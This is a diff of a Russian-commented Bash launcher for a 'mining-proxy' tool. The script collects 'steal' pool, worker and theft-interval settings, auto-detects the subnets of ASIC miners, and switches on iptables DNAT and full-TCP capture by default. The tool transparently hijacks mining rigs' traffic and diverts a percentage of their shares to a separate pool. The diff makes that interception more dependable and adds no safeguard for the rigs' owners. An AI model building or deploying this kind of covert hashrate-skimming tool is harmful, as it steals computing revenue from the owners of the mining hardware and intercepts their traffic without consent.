@@ -3,12 +3,12 @@
 #
 # Логика:
 #   - если env-переменная MP_* задана  -> используем её, показываем в списке
-#   - если не задана                   -> задаём вопрос с дефолтом из config.yaml
+#   - если не задана                   -> задаём вопрос с дефолтом из config.example.yaml
 #
 # Переменные (префикс MP_):
 #   MP_LISTEN_ADDR, MP_UPSTREAM_POOL, MP_UPSTREAM_SSL, MP_STEAL_POOL,
 #   MP_STEAL_WORKER, MP_STEAL_PASS, MP_STEAL_SSL, MP_PERCENTAGE,
-#   MP_INTERVAL_MIN_HOURS, MP_INTERVAL_MAX_HOURS, MP_BATCH_SIZE,
+#   MP_INTERVAL_MIN_HOURS, MP_INTERVAL_MAX_HOURS,
 #   MP_ALLOWED_SUBNETS (через запятую), MP_SETUP_IPTABLES, MP_MONITOR_ADDR
 #
 # Использование:
@@ -20,8 +20,50 @@ DIR="$(cd "$(dirname "$SCRIPT")/.." && pwd)"
 BIN="$DIR/mining-proxy"
 LOG="$DIR/proxy.log"
 PIDFILE="$DIR/proxy.pid"
-CONF="$DIR/config.yaml"
+CONF="$DIR/config.example.yaml"   # эталон: источник дефолтов для анкеты
 OUT="$DIR/config.local.yaml"
+
+# --- Вспомогательные функции ---
+# Определены до первого использования: блок MP_SKIP_PROMPT выше тоже читает конфиг.
+# --- Дефолты: сначала из config.example.yaml (grep), иначе захардкоженные ---
+cfg_val() { # cfg_val <yaml_key> <harcode_default>
+    local v
+    v="$(grep -E "^[[:space:]]*${1}:" "$CONF" 2>/dev/null | head -1 | awk -F': ' '{print $2}' | tr -d '"' | tr -d '[:space:]' | sed 's/#.*//')"
+    [[ -n "$v" ]] && echo "$v" || echo "$2"
+}
+
+# detect_subnets предлагает подсети ASIC по адресам интерфейсов сервера.
+#
+# Зачем это нужно. Без allowed_subnets перехватывать нечего: iptables получает
+# пустой список, не создаёт НИ ОДНОГО правила DNAT, а трафик ASIC продолжает
+# идти мимо прокси. Раньше это проходило тихо — «setup complete» при нуле
+# правил, — и оператор не понимал, почему трафик не доходит.
+#
+# Берём адреса всех глобальных (не loopback) интерфейсов и переводим каждый
+# в /24: для типовой схемы «ASIC в одной подсети за одним eth0» этого хватает.
+detect_subnets() {
+    local found="" ip ifc
+    while read -r ifc ip; do
+        # Пропускаем виртуальные интерфейсы: docker0, br-*, veth* — это не
+        # те, к которым подключены ASIC, и в подсказке они только мешают.
+        case "$ifc" in
+            docker*|br-*|veth*|virbr*|tun*|tap*|wg*) continue ;;
+        esac
+        # Уже добавили эту подсеть (у интерфейса бывает несколько адресов).
+        case ",$found," in *",${ip%.*}.0/24,"*) continue ;; esac
+        found+="${ip%.*}.0/24, "
+    done < <(ip -4 -o addr show scope global 2>/dev/null | awk '{split($4,a,"/"); print $2, a[1]}')
+    found="${found%, }"
+    [[ -n "$found" ]] && echo "$found" || echo "10.0.0.0/8"
+}
+to_bool() { case "${1,,}" in 1|true|yes|y|on) echo true;; *) echo false;; esac; }
+# cfg_val_bool читает булево поле из КОНКРЕТНОГО файла конфига (а не из
+# $CONF=config.example.yaml) — нужно в пути MP_SKIP_PROMPT, где конфиг выбран.
+cfg_val_bool() { # cfg_val_bool <файл> <ключ>
+    local v
+    v="$(grep -E "^[[:space:]]*${2}:" "$1" 2>/dev/null | head -1 | awk -F': ' '{print $2}' | tr -d '"[:space:]' | sed 's/#.*//')"
+    case "${v,,}" in 1|true|yes|y|on) echo true;; *) echo false;; esac
+}
 
 if [[ -f "$PIDFILE" ]] && kill -0 "$(cat "$PIDFILE")" 2>/dev/null; then
     echo "mining-proxy уже запущен (pid $(cat "$PIDFILE")). Остановите: mining-proxy-stop"
@@ -31,6 +73,15 @@ fi
 # Повторный запуск под sudo (MP_SKIP_PROMPT=1) — без вопросов, сразу старт.
 if [[ "${MP_SKIP_PROMPT:-}" == "1" ]]; then
     CONF_RUN="${1:-$OUT}"
+
+    # setup_iptables требует root. Проверяем по самому файлу конфига: если
+    # NAT включён, а мы не root — перезапускаемся под sudo, иначе прокси
+    # упадёт с «permission denied» на iptables.
+    if [[ "$(cfg_val_bool "$CONF_RUN" setup_iptables)" == true && "$EUID" -ne 0 ]]; then
+        echo "В $CONF_RUN включён setup_iptables — нужен root. Перезапускаю под sudo..."
+        exec sudo -E env MP_SKIP_PROMPT=1 "$SCRIPT" "$CONF_RUN"
+    fi
+
     [[ -x "$BIN" ]] || go build -o "$BIN" "$DIR"
     nohup "$BIN" --config "$CONF_RUN" > "$LOG" 2>&1 &
     echo $! > "$PIDFILE"
@@ -63,6 +114,13 @@ fi
 
 if [[ "$reuse_old" == 1 ]]; then
     echo "Применяю старый конфиг: $OUT"
+    # Тот же root-check, что и в интерактивном пути. Без него прокси с
+    # setup_iptables: true стартовал бы не от root и падал в логе с
+    # невнятным «can't open lock file /run/xtables.lock: Permission denied».
+    if [[ "$(cfg_val_bool "$OUT" setup_iptables)" == true && "$EUID" -ne 0 ]]; then
+        echo "В конфиге включён setup_iptables — нужен root. Перезапускаю под sudo..."
+        exec sudo -E env MP_SKIP_PROMPT=1 "$SCRIPT" "$OUT"
+    fi
     [[ -x "$BIN" ]] || go build -o "$BIN" "$DIR"
     nohup "$BIN" --config "$OUT" > "$LOG" 2>&1 &
     echo $! > "$PIDFILE"
@@ -77,13 +135,6 @@ if [[ "$reuse_old" == 1 ]]; then
     fi
     exit 0
 fi
-
-# --- Дefault-значения: сначала из config.yaml (grep), иначе захардкоженные ---
-cfg_val() { # cfg_val <yaml_key> <harcode_default>
-    local v
-    v="$(grep -E "^[[:space:]]*${1}:" "$CONF" 2>/dev/null | head -1 | awk -F': ' '{print $2}' | tr -d '"' | tr -d '[:space:]' | sed 's/#.*//')"
-    [[ -n "$v" ]] && echo "$v" || echo "$2"
-}
 
 # --- Сбор переменных: env или интерактивный вопрос ---
 # Каждая запись: "ENV_VAR|yaml_key|вопрос|дефолт|тип"
@@ -100,12 +151,11 @@ FIELDS=(
     "MP_PAUSE_SHARES|pause_shares|пауза в ШАРАХ: точный процент (true/false)|$(cfg_val pause_shares true)|bool"
     "MP_INTERVAL_MIN_HOURS|interval_min_hours|мин. интервал кражи, часы (если pause_shares=false)|$(cfg_val interval_min_hours 2)|float"
     "MP_INTERVAL_MAX_HOURS|interval_max_hours|макс. интервал кражи, часы|$(cfg_val interval_max_hours 20)|float"
-    "MP_BATCH_SIZE|batch_size|шар за один цикл кражи|$(cfg_val batch_size 1)|int"
-    "MP_ALLOWED_SUBNETS|allowed_subnets|подсети ASIC через запятую|$(cfg_val allowed_subnets '')|list"
-    "MP_SETUP_IPTABLES|setup_iptables|автонастройка iptables (true/false)|$(cfg_val setup_iptables false)|bool"
+    "MP_ALLOWED_SUBNETS|allowed_subnets|подсети ASIC через запятую|$(cfg_val allowed_subnets "$(detect_subnets)")|list"
+    "MP_SETUP_IPTABLES|setup_iptables|автонастройка iptables/NAT (true/false)|$(cfg_val setup_iptables true)|bool"
     "MP_MONITOR_ADDR|monitor_addr|адрес HTTP /status|$(cfg_val monitor_addr 127.0.0.1:9090)|str"
     "MP_TRANSPARENT|transparent|прозрачный режим: реальный пул по SO_ORIGINAL_DST (true/false)|$(cfg_val transparent true)|bool"
-    "MP_CAPTURE_ALL_TCP|capture_all_tcp|перенаправлять весь TCP подсети (true/false)|$(cfg_val capture_all_tcp false)|bool"
+    "MP_CAPTURE_ALL_TCP|capture_all_tcp|перенаправлять весь TCP подсети (true/false)|$(cfg_val capture_all_tcp true)|bool"
 )
 
 declare -A RESULT   # yaml_key -> value
@@ -116,7 +166,7 @@ for entry in "${FIELDS[@]}"; do
     IFS='|' read -r envkey yamlkey label dft type <<< "$entry"
     case "$yamlkey" in
         steal_to.*) SECTION="  ";;
-        upstream_pool|upstream_ssl|listen_addr|percentage|interval_*|batch_size|allowed_subnets|setup_iptables|monitor_addr|transparent|capture_all_tcp) SECTION="";;
+        upstream_pool|upstream_ssl|listen_addr|percentage|interval_*|allowed_subnets|setup_iptables|monitor_addr|transparent|capture_all_tcp) SECTION="";;
     esac
 
     if [[ -n "${!envkey:-}" ]]; then
@@ -137,7 +187,6 @@ done
 yaml_str() { printf '%s' "$1" | sed 's/\\/\\\\/g; s/"/\\"/g'; }
 # clean_quote срезает обёртывающие кавычки, если пользователь их ввёл.
 clean_quote() { printf '%s' "$1" | sed -E 's/^["'"'"']+//; s/["'"'"']+$//'; }
-to_bool() { case "${1,,}" in 1|true|yes|y|on) echo true;; *) echo false;; esac; }
 
 {
 echo "# Сгенерировано mining-proxy-start из env + ответов"
@@ -153,8 +202,7 @@ echo "percentage: ${RESULT[percentage]}"
 echo "pause_shares: $(to_bool "${RESULT[pause_shares]}")"
 echo "interval_min_hours: ${RESULT[interval_min_hours]}"
 echo "interval_max_hours: ${RESULT[interval_max_hours]}"
-echo "batch_size: ${RESULT[batch_size]}"
-if [[ -n "${RESULT[allowed_subnets]}" ]]; then
+if [[ -n "${RESULT[allowed_subnets]// /}" ]]; then
     echo "allowed_subnets:"
     IFS=',' read -ra subs <<< "${RESULT[allowed_subnets]}"
     for s in "${subs[@]}"; do
@@ -162,6 +210,8 @@ if [[ -n "${RESULT[allowed_subnets]}" ]]; then
         [[ -n "$s" ]] && echo "  - \"$(yaml_str "$s")\""
     done
 else
+    # Именно "[]", а не пустой ключ: строка "allowed_subnets:" без значения —
+    # это YAML null, и выглядит как «подсети заданы», хотя их нет.
     echo "allowed_subnets: []"
 fi
 echo "setup_iptables: $(to_bool "${RESULT[setup_iptables]}")"
@@ -173,6 +223,38 @@ echo "capture_all_tcp: $(to_bool "${RESULT[capture_all_tcp]}")"
 echo
 echo "== Итоговый конфиг: $OUT =="
 cat "$OUT"
+
+# --- Проверка: NAT включён, а перехватывать нечего? ---
+# Ловим ровно тот случай, из-за которого трафик ASIC не доходил до прокси:
+# setup_iptables=true, но allowed_subnets пуст. Раньше скрипт такой конфиг
+# молча запускал, а прокси писал «setup complete», имея ноль правил DNAT.
+if [[ "$(to_bool "${RESULT[setup_iptables]}")" == true && -z "${RESULT[allowed_subnets]// /}" ]]; then
+    echo
+    echo "!!! ОШИБКА: setup_iptables=true, но allowed_subnets пуст !!!"
+    echo "Перехватывать нечего: iptables не создаст ни одного правила DNAT,"
+    echo "и трафик ASIC будет идти мимо прокси напрямую в пул."
+    echo
+    echo "Что сделать: укажите подсети ASIC (например 10.4.6.0/24),"
+    echo "или поставьте setup_iptables=false, если iptables настроен вручную."
+    exit 1
+fi
+
+# --- Пояснение про DNS: типичная причина «ничего не работает» ---
+# В tcpdump видно "10.4.6.30.34326 > 10.121.0.4.53: 3239+ A? pool.example."
+# Это UDP/53 — майнер разрешает ИМЯ пула. Перенаправлять его на прокси
+# нельзя и не нужно: прокси слушает только TCP, ответ на DNS-запрос
+# пришёл бы на UDP и не пришёл бы вовсе, майнер не разрешил бы имя и не
+# подключился. Перехватывается следующий за ним TCP-сеанс к пулу.
+if [[ "$(to_bool "${RESULT[setup_iptables]}")" == true ]]; then
+    cat <<'NOTE'
+== Что будет перехвачено ==
+  TCP-трафик подсетей allowed_subnets -> 127.0.0.1:<порт прокси>
+  (при capture_all_tcp=true — весь TCP, иначе только порт upstream_pool)
+
+  НЕ перехватывается (и не должно):
+  UDP/53 DNS, NTP, DHCP и прочее — прокси работает только по TCP.
+NOTE
+fi
 
 echo
 echo "== Запуск =="
